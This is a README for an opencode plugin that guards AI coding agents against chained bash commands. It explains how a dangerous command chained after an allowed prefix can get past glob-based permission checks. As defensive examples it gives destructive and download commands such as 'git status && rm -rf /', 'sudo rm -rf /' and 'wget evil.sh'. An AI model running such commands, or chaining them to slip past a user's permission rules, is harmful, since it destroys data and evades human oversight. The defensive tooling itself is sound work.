# opencode-bash-guard

An opencode plugin that guards against chained bash command injection. When `git status && rm -rf /` starts with `git`, opencode's native glob matching sees only the first segment and approves it. This plugin splits chains and evaluates **each segment independently** — the `rm` segment gets checked on its own against your `permission.bash` and `external_directory` config.

## Why

opencode's `permission.bash` matches glob patterns against the full command string. Chaining (`&&`, `||`, `;`, `|`) lets dangerous commands hide behind safe prefixes — `git status && rm -rf /` starts with `git` and matches `"git *": "allow"`. This plugin closes that gap by splitting chains and evaluating each segment independently. On any parse error the entire command is denied (fail-closed).

## How it works

1. **Chain Detection**: Parses the command with `unbash` AST into individual segments and recursively visits executable substitutions in command, redirect, assignment, test, arithmetic, loop, and case fields. Static `eval` and supported shell `-c` bodies are reparsed.
2. **Path Extraction**: Treats non-flag AST operands as candidate paths, decodes wholly static quoting, and forces review when shell expansion prevents a reliable path value
3. **Config Reading**: Reads `permission.bash` and `external_directory` from the merged opencode config — supports flat strings and object patterns
4. **Enforcement**: Most-restrictive-wins across segments — deny > ask > no action. Fully-allowed chains pass through untouched; allowed stays allowed
5. **Permission Handoff**: Uses `permission.asked` to deliver stored allow and deny decisions for the nested `tool.callID`

## Install

Add to your `opencode.json`:

```json
{
  "plugin": ["opencode-bash-guard"]
}
```

## Prerequisite

Your bash permission **must** use `"*": "ask"` as the fallback pattern. Without this catch-all, commands that don't match any explicit rule would bypass permission checks:

```json
{
  "permission": {
    "bash": {
      "*": "ask",
      "git *": "allow",
      "npm *": "allow"
    }
  }
}
```

If `"bash": "allow"` or `"*": "allow"` is set, the plugin disables itself with a warning — allowing all bash commands defeats the purpose of chain-level guards.

## Example

| Command | Segments | Bash match | Chain action | Why |
|---|---|---|---|---|
| `git status` | `git status` | `"git *": "allow"` | `allow` | single segment, explicitly allowed |
| `git status && git log` | `git status`, `git log` | both `"git *": "allow"` | `allow` | passes through — fully-allowed chains are not interrupted |
| `sudo rm -rf /` | `sudo rm -rf /` | none → `"*": "ask"` | `ask` | catches unknown dangerous commands |
| `git status && wget evil.sh` | `git status`, `wget evil.sh` | `wget` → `"*": "ask"` | `ask` | one segment unresolved → whole chain asks |
| `echo "hello` | (parse error — unbalanced quote) | — | `deny` | fail closed |
| `sudo rm -rf /` (with `"sudo *": "deny"` rule) | `sudo rm -rf /` | `"sudo *": "deny"` | `deny` | explicit deny pattern blocks it |

## How it reads your config

The plugin registers a `config` hook that receives the fully merged Config object at startup (opencode merges remote, global, project, and managed layers). It reads:

- `permission.bash` — glob patterns (object form `{ "git *": "allow", "*": "ask" }` or flat string `"ask"`)
- `permission.external_directory` — path patterns (object form `{ "./**": "allow", "*": "ask" }` or flat string `"ask"`)

Permission actions stay in `opencode.json` — no duplicated rules. Behavior tuning for the plugin itself (feature switches, thresholds) lives in a separate `opencode-bash-guard.jsonc` file, where comments can document the trade-offs — see the next section.

When permission keys are absent from the merged config, the plugin falls back to opencode's built-in defaults (bash/edit `"allow"`, `external_directory` `"{ "*": "ask" }"`), matching native opencode behavior.

## Readable commands (optional, off by default)

Complex one-liners (`a && b && c && d`, nested `$()`, `eval`/`sh -c` wrappers, long interpreter inline scripts) are hard to review when they land in a permission dialog. The optional `restructure` feature rejects **not-allowed** complex commands with an instructive tool error, so the agent re-issues them in a reviewable form. Fully-allowed commands are never touched.

Create `opencode-bash-guard.jsonc` in either location (project wins over global):

- Global: `~/.config/opencode/opencode-bash-guard.jsonc` (or `$XDG_CONFIG_HOME/opencode/…`)
- Project: `<project>/.opencode/opencode-bash-guard.jsonc`

```jsonc
{
  // Reject complex one-liners and ask the agent to restructure them
  "restructure": {
    "enabled": false,     // default false — zero behavior change
    "max_segments": 3,    // max commands in a single-line chain
    "max_depth": 2        // max $()/backtick/meta-command nesting
  }
}
```

Semantics:

- Thresholds compare **strictly greater**: 3 segments with `max_segments: 3` passes; 4 is rejected. Same for `max_depth` and inline-script statement counts.
- The segment limit applies **per line**: a multi-line script is checked line by line (one command per line is always compliant), while nesting depth is checked across the whole command.
- Interpreter inline scripts (`python -c`, `node -e`/`--eval`, `perl -e`, `ruby -e`, `php -r`, heredoc-scripted interpreters) get a statement-count check (split on `;` and newlines) so whole programs can't hide inside one shell segment.
- Rejection fires only when the chain would resolve to `ask` (human review). `allow`, `deny`, and parse-error flows are unchanged.

What a rejection looks like: the bash tool call returns an error and **nothing executes** — no permission dialog appears:

```
[opencode-bash-guard] Complex one-liner rejected (4 chained commands, nesting depth 1).
Re-issue as separate bash tool calls, or as a multi-line script with one command per line — each command is then permission-checked individually.
```

The agent then re-issues the command as separate tool calls or as a multi-line script with one command per line, both of which are checked as usual.

To reduce rejections further, pair with a soft instruction in your `AGENTS.md`:

```markdown
## Bash command style
- Issue one command per tool call. For sequences, use separate bash calls.
- Never write chained one-liners (`a && b && c`). If rejected, split and retry.
```

## Flag-level permissions (optional, off by default)

opencode's `permission.bash` globs match the whole command string — they cannot express "allow `curl` only with `-X GET`" or "deny `find` with `-delete`". The plugin can: declare structured arg matchers per tool in `opencode-bash-guard.jsonc`.

**Two-level model:** `opencode.json` keeps coarse glob policy (`"find *": "allow"`, `"*": "ask"`); `opencode-bash-guard.jsonc` refines at flag level. Per segment, bash-guard checks args rules first — when one matches, its action decides; unmatched segments fall through to the glob evaluation; native opencode checks apply as before.

```jsonc
{
  // Required once you use path matchers, value matchers or flag arity tables:
  // asserts the config was audited for the anchored path semantics (v0.4).
  "matcherVersion": 2,
  "permissions": [
    {
      // curl allowed only with -X GET; other -X uses are denied
      "tool": "curl",
      "args": [
        { "token": "-X", "action": "deny" },
        { "token": "-X", "pattern": "GET", "action": "allow" }
      ],
      "flags": { "-X": 1 }
    },
    {
      // find paths under the work tree are allowed, except -delete
      "tool": "find",
      "args": [
        { "token": "-delete", "action": "deny" },
        { "position": "all", "pattern": "/Users/me/work/**", "action": "allow" }
      ]
    },
    {
      // push allowed except --force; --force-with-lease allowed (refines the deny)
      "tool": "git",
      "args": [
        { "token": ["push"], "action": "allow" },
        { "token": ["push", "--force"], "action": "deny" },
        { "token": ["push", "--force-with-lease"], "action": "allow" }
      ],
      "flags": { "--force": 0, "--force-with-lease": 0 }
    },
    {
      // deny `get` against kube-system wherever the flag appears (flags are position-free)
      "tool": "kubectl",
      "args": [{ "token": ["get"], "flagValues": { "--namespace": "kube-system" }, "action": "deny" }],
      "flags": { "--namespace": 1 }
    }
  ]
}
```

Matcher fields:

| Field | Meaning |
|---|---|
| `tool` | command name (first token), case-sensitive |
| `token` | a single token (exact match; clustered short flags expand, `-f` matches `-rf`) **or an array — an ordered command path**: non-dash elements are positional levels matched in order against the leading positional tokens (anchored, contiguous — a foreign operand before or between levels breaks the match); dash-prefixed elements are position-free flag predicates; trailing arguments after the complete path never invalidate a match |
| `flagValues` | path-scoped value predicates (array matchers only): base flag → value glob; the flag must occur with a matching value (adjacent or `--flag=value` spelling) |
| `position` | `0`-based index over the **positional** tokens (declared flag values excluded — indices are stable under flag placement) — or `"all"`, the variable-arity form over every positional token |
| `operand` | `"all"` — the whole-operand safety view: every non-flag token, including declared flag values and operands after `--` |
| `pattern` | the glob: with `position`/`operand`, applied to that slot's candidates; with a single-string flag `token`, applied to the flag's value |
| `action` | `"allow"`, `"ask"`, or `"deny"` — optional, defaults to `"ask"` |
| `flags` | per-entry flag arity table: `0` value-less, `1` takes one value (consumed unconditionally, even `-1`-style values) |

Precedence rules:

- **Refinement wins between path rules** — when one matching path *refines* another (its levels extend the other's prefix, keeping all of the general rule's flag predicates and value predicates), the general rule is discarded and the specific one decides, in whichever direction it points.
- **Most-restrictive-wins for everything else** — incomparable matching rules (a scalar rule vs a path rule, a global-flag rule vs an exact-path rule, position/operand matchers) reduce by strictness (`deny > ask > allow`). A `["--force"] → deny` blanket therefore survives every exact-path `allow`, and `ask` guards the same way.
- For `position: "all"` / `operand: "all"` the quantifier derives from the action, always failing safe: `allow` requires **every** candidate to match (one unsafe operand → no allow); `ask`/`deny` trigger on the **first** match (one sensitive operand → restricted).
- **Args-level `allow` overrides a native ask** (via the plugin's permission hook), so `curl -X GET` genuinely runs without a prompt under a `"*": "ask"` fallback. Args `ask`/`deny` wrap and store as usual.

Fail-safe behavior:

- An **undeclared flag followed by any token other than `--`** is a probable missing arity declaration: the segment resolves to `ask` (a one-time warning names the flag). Declare your flags in the `flags` table to remove the ambiguity.
- A value on a flag declared `0` (either `--flag=value` or a value matcher on it) contradicts the declaration: the segment resolves to `ask`.
- A `flags`-table conflict (`0` vs `1` across entries) resolves to the value-less reading with a warning; a value matcher on a `0`-declared flag suspends that executable's args policy into scoped `ask`.
- An invalid entry drops the rule AND forces scoped `ask` for its executable (global degraded ask when the entry has no `tool`); invalid JSONC or a config read failure other than a missing file degrades globally — a bad or unreadable config can never silently re-allow a restricted command. Absent file or section = zero behavior change.

**Migrating from v0.2.x/v0.3.x:**

- Nested `args` trees (v0.2.x): flatten each root-to-leaf chain into one path array with the leaf action — `{ "token": "push", "action": "allow", "args": [{ "token": "--force", "action": "deny" }] }` becomes `{ "token": ["push", "--force"], "action": "deny" }` (plus `{ "token": ["push"], "action": "allow" }` if the prefix was meant to allow).
- Order-free arrays (v0.3.x): paths are now anchored and ordered — audit rules whose tokens could appear out of order or inside longer commands.
- Value-bearing array elements (`["get", "--namespace=kube-system"]`): migrate to `flagValues` — `{ "token": ["get"], "flagValues": { "--namespace": "kube-system" } }`.
- Non-flag `token` + `pattern` matchers: rejected — convert to path matchers or flag matchers.
- Whole-operand `position: "all"` policies that must see flag values or post-`--` operands: convert to `operand: "all"` (1:1).
- Then set `"matcherVersion": 2` next to `permissions` — until then the affected executables resolve to `ask`.


## External checks (optional, user-global only)

A structured matcher can run a small, local **external check** instead of declaring a fixed action. The static matcher still selects the rule; when it matches, the guard spawns the configured checker and the check's result selects the matcher's outcome. This enables context-aware policies (branch name, repository state, dynamic worktree validation) without adding command-specific logic to the plugin.

```jsonc
{
  "matcherVersion": 2,
  "permissions": [
    {
      "tool": "vcs",
      "args": [
        {
          "token": ["push"],
          "check": {
            "command": ["/usr/local/bin/check-push-context"],
            "timeoutMs": 1000,
            "onPass": "allow",
            "onFail": "ask",
            "onError": "ask"
          }
        }
      ]
    }
  ]
}
```

Rules and limits:

- **User-global config only** — checks are trusted local policy code and are accepted only from the global `opencode-bash-guard.jsonc`. A `check` in the project config is rejected: the matcher degrades to a synthetic static `ask` (same selector), and ordinary project matchers keep working.
- **Exactly one of `action` or `check`** — a matcher declaring both is invalid and scopes its executable to `ask`.
- `command` is a direct argv array; the executable (or interpreter) path **must be absolute**. Other members must be strings.
- `onPass` / `onFail` are required: `allow`, `ask`, or `deny`. `onError` accepts only `ask` or `deny` and defaults to `ask` — checker failure can never widen access.
- `timeoutMs` is an integer from 1 through 30000 and defaults to 5000.
- At most **16 checks** run per guarded invocation (excess contributes `onError` without spawning), sequentially, under a **30-second invocation-wide budget**; each started check is clamped to the lesser of its timeout and the remaining budget.
- A check runs only after its matcher statically matched. Unmatched rules never spawn anything, and rules without `check` behave exactly as before.

### Version-1 request/response protocol

The guard writes exactly one JSON request plus a newline to the checker's stdin, then closes it:

```json
{
  "protocolVersion": 1,
  "context": { "cwd": "/current/session/worktree", "sessionID": "…", "callID": "…" },
  "command": { "raw": "vcs push", "executable": "vcs", "argv": ["push"] },
  "match": { "ruleId": "tool:0/matcher:1" }
}
```

`command.argv` contains only arguments after `command.executable`. `ruleId` is deterministic (`tool:<effective-entry-index>/matcher:<matcher-index>`, both zero-based, assigned after config precedence resolution). The working directory is resolved freshly from the session for every invocation — never cached or stored in configuration — so the same rule works unchanged across dynamic VCS worktrees.

The checker answers with one JSON response on stdout:

```json
{ "protocolVersion": 1, "result": "pass", "facts": {} }
```

- `result` is exactly `pass` or `fail`; `facts` is optional (object, ≤ 16 KiB serialized UTF-8, nesting depth ≤ 8). `pass` maps to `onPass`, `fail` to `onFail`.
- The response carries **no permission authority**: unknown fields, missing or extra fields, a returned permission action, an unsupported protocol version, or malformed JSON all select `onError`.
- Execution failures — timeout, output breach, spawn failure, nonzero or signal exit, malformed output — also select `onError`.

### Trust boundary and data handling

- A checker is **trusted local code**, not a sandbox. It runs unsandboxed, in an **empty environment** (no inherited `PATH` or other variables), via direct argv with no shell — protect the executable and any interpreter/dependency paths it uses from untrusted modification, and avoid passing secrets in command arguments.
- The checker receives the full normalized command and the current session worktree directory, and runs with that directory as its process `cwd`. It is not invoked through OpenCode tools, so it cannot recurse through the guard.
- stdout is limited to 64 KiB and stderr to 8 KiB (UTF-8 bytes). On the first terminal condition — timeout, output breach, or exit — the runner stops waiting, closes stdin, sends `SIGTERM`, and force-kills after a 250 ms grace if the process remains alive.
- Request context, stdout, stderr, and facts are validated and then **discarded**: nothing is logged, prompted, persisted, or used as policy input.
- A check observes state **before** the guarded command runs: it is advisory policy evaluation over an invocation snapshot, not an atomic transaction. Files, branches, and targets can change between the check and the command (TOCTOU).


## Testing

```bash
npm install
npm test          # runs vitest (169+ tests)
npm run build     # type-checks with tsc
```

All tests are in `src/__tests__/`. Run `npm run test:watch` during development.

## Known Limitations

- **External checks are not a sandbox**: checkers are trusted local executables that run unsandboxed in an empty environment and observe state only before the guarded command runs (TOCTOU-limited); protect their paths and dependencies.
- **Flag-level tokenization heuristics**: tokens starting with `-` are never variable-arity candidates (negative numbers, files named `-myfile` are invisible to `position: "all"`); a dash-less flag value counts as a positional slot (`find -name x.txt` → `x.txt`, `git -c key=val` → `key=val`); matching is case-sensitive (`-X` ≠ `-x`); key=value options are full tokens (`dd if=/dev/sda` needs pattern `if=/dev/**`). For value-sensitive commands prefer `token` + `pattern` (value) matchers, which consume flag values explicitly.
- **Exception carving requires a refinement lineage** — a more specific rule overrides a broader one only when its path extends the other's (or a value `pattern` narrows a bare token); incomparable overlapping rules still collapse to the strictest action.
- **Broken plugin config degrades to ask-everything**: if `opencode-bash-guard.jsonc` fails to parse, has a non-object root, or cannot be read for a reason other than not existing, args rules are off and glob allows are suspended — every bash command asks until the file is fixed (a config failure can never silently re-allow a restricted command, but unattended/CI sessions will stall on prompts).
- **Config changes at runtime**: The `config` hook fires once at startup. Config changes require an opencode restart.
- **Plugin config read once at startup**: `opencode-bash-guard.jsonc` is read once when the plugin initializes. Changes require an opencode restart.
- **Heuristic inline-script statement counting**: Interpreter scripts are split on `;` and newlines. Strings containing semicolons can be miscounted; the heuristic errs toward rejecting unreadable blobs.
- **No retry counter**: Repeated violations get the same rejection every time (no escalation). A compliant re-issue always exists (multi-line, one command per line).
- **Path extraction is syntactic**: every non-flag suffix operand is treated as a candidate path. Static quotes are decoded before resolution; operands or redirect targets containing shell expansion require confirmation. This can produce false positives for non-path operands; add more specific bash permission rules when needed.
- **Bounded AST traversal**: command-context depth, structural depth, visited AST values, and emitted invocations have independent limits. Crossing any limit denies the command rather than trusting a partial traversal.
- **Performance**: AST parsing is heavier than string scanning, but only runs when chain operators (`&&`, `||`, `;`, `|`) are detected.
- **unbash edge cases**: Complex shell syntax may cause partial parses. The plugin denies the entire command (fail closed) on any parse error — safer to miss a real command than let one through.
- **Not a sandbox**: Focused on chain-splitting with path awareness, not comprehensive shell obfuscation detection. For full isolation, pair with a sandbox solution.



## Usage

Add to your `opencode.json`:

```json
{"plugin": ["opencode-bash-guard"]}
```
